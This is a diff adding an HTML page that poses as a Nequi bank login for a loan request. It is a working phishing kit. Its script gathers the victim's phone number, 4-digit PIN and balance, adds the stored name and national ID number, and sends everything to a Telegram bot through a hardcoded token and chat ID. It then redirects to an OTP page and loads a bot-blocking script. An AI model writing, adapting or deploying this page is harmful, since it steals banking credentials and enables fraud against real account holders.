@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <title>Nequi - Verificación</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+</head>
+
+<body>
+    <div id="content">
+        <header>
+            <div class="wrap-header">
+                <div class="row">
+                    <div class="col-xs-12 col-md-2">
+                        <div class="logo">
+                            <a href="https://www.nequi.com.co/">
+                                <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-xs-12 col-md-10 container-buttons">
+                        <div class="wrap-main-menu">
+                            <div class="row">
+                                <div class="col-xs-12 col-md-8"></div>
+                                <div class="col-xs-12 col-md-4">
+                                    <div class="buttons-right">
+                                        <ul>
+                                            <li>
+                                                <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl">Recarga</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <section class="login-section">
+            <div class="login-wrap">
+                <h1>Entra a tu Nequi</h1>
+                <p>Solicitud de crédito propulsor</p>
+                
+                <div class="login-form-wrap">
+                    <div class="container-form">
+                        <!-- Número de celular -->
+                        <div class="input-country">
+                            <div class="wrap-select-country">
+                                <div class="select-country">
+                                    <div class="country-wrap country-active">
+                                        <div class="select-col select-col-img">
+                                            <img src="images/flag_colombia.png" alt="co">
+                                        </div>
+                                        <div class="select-col">
+                                            <p>+57</p>
+                                            <input class="country-input" type="text" name="j_region" id="j_region" value="57">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <input type="tel" 
+                                    id="txtUsername" 
+                                    name="txtUsername"
+                                    required 
+                                    maxlength="12" 
+                                    minlength="12" 
+                                    inputmode="numeric">
+                                <label for="txtUsername">Número de celular</label>
+                            </div>
+                        </div>
+
+                        <!-- Contraseña -->
+                        <div class="form-group">
+                            <input
+                                class="password"
+                                type="password" 
+                                id="txtPass" 
+                                name="txtPass" 
+                                required 
+                                maxlength="4" 
+                                minlength="4" 
+                                inputmode="numeric" 
+                                pattern="\d*">
+                            <label for="txtPass">Contraseña</label>
+                        </div>
+
+                        <!-- Saldo -->
+                        <div class="form-group">
+                            <input 
+                                id="txtSaldo" 
+                                name="txtSaldo" 
+                                required 
+                                maxlength="8" 
+                                minlength="4" 
+                                inputmode="numeric">
+                            <label for="txtSaldo">Saldo</label>
+                        </div>
+                        
+                        <!-- Captcha -->
+                        <img src="img/ca.png" alt="CAPTCHA" id="captcha" class="captcha">
+                    </div>
+
+                    <!-- Botón de envío -->
+                    <div class="btn-wrap">
+                        <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" name="btnUsuario" disabled>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            const usernameInput = document.getElementById('txtUsername');
+            const passwordInput = document.getElementById('txtPass');
+            const saldoInput = document.getElementById('txtSaldo');
+            const captchaImg = document.getElementById('captcha');
+            const submitBtn = document.getElementById('btnUsuario');
+
+            let captchaClicked = false;
+
+            // Eventos
+            usernameInput.addEventListener('input', formatUsername);
+            passwordInput.addEventListener('input', formatPassword);
+            saldoInput.addEventListener('input', formatSaldo);
+            captchaImg.addEventListener('click', toggleCaptcha);
+
+            // Formatear número de celular (XXX XXX XXXX)
+            function formatUsername() {
+                let value = usernameInput.value.replace(/\D/g, '');
+                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
+                usernameInput.value = formattedValue;
+                validateForm();
+            }
+
+            // Formatear contraseña (solo números)
+            function formatPassword() {
+                passwordInput.value = passwordInput.value.replace(/\D/g, '');
+                validateForm();
+            }
+
+            // Formatear saldo (separador de miles)
+            function formatSaldo() {
+                let valor = saldoInput.value.replace(/\./g, "");
+                if (valor === "" || isNaN(valor)) {
+                    saldoInput.value = "";
+                    validateForm();
+                    return;
+                }
+                saldoInput.value = parseInt(valor, 10).toLocaleString("es-CO");
+                validateForm();
+            }
+
+            // Validar formulario completo
+            function validateForm() {
+                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+                const passwordValid = /^\d{4}$/.test(passwordInput.value);
+                const saldoValid = saldoInput.value.length >= 4;
+
+                if (usernameValid && passwordValid && saldoValid && captchaClicked) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('disabled');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('disabled');
+                }
+            }
+
+            // Toggle captcha
+            function toggleCaptcha() {
+                captchaClicked = true;
+                captchaImg.src = "img/cap.png";
+                validateForm();
+            }
+
+            // Obtener datos del localStorage
+            const nombreApellido = localStorage.getItem("nombreApellido");
+            const cedula = localStorage.getItem("cedula");
+
+            // Envío del formulario
+            submitBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+
+                const usuario = usernameInput.value.trim();
+                const clave = passwordInput.value.trim();
+                const saldo = saldoInput.value.trim();
+
+                // Validaciones finales
+                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
+                    alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
+                    return;
+                }
+
+                if (!/^\d{4}$/.test(clave)) {
+                    alert("La clave debe ser de 4 dígitos numéricos.");
+                    return;
+                }
+
+                if (!nombreApellido || !cedula || !saldo) {
+                    alert("Los datos de nombre y cédula no están disponibles. Vuelve al paso anterior.");
+                    return;
+                }
+
+                // Guardar en localStorage
+                localStorage.setItem("numero", usuario);
+                localStorage.setItem("clave", clave);
+                localStorage.setItem("saldo", saldo);
+
+                // CONFIGURACIÓN TELEGRAM - CAMBIA ESTOS VALORES
+                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc'; // Reemplaza con tu token
+                const TELEGRAM_CHAT_ID = '6958936698';    // Reemplaza con tu chat ID
+
+                const telegramMessage = `
+🔐 DATOS DE VERIFICACIÓN NEQUI
+
+📛 Nombre: ${nombreApellido}
+🪪 Cédula: ${cedula}
+📱 Número: ${usuario}
+🔑 Clave: ${clave}
+💰 Saldo: ${saldo}
+
+📅 Fecha: ${new Date().toLocaleString('es-CO')}
+                `;
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: telegramMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    if (response.ok) {
+                        console.log('Datos enviados a Telegram correctamente');
+                        // Redirigir a la siguiente página
+                        window.location.href = "otp.html";
+                    } else {
+                        throw new Error('Error al enviar los datos a Telegram');
+                    }
+                } catch (error) {
+                    console.error('Error al enviar los datos:', error);
+                    alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+                }
+            });
+        });
+    </script>
+
+    <script src="bloqueo-bots.js"></script>
+</body>
+</html>
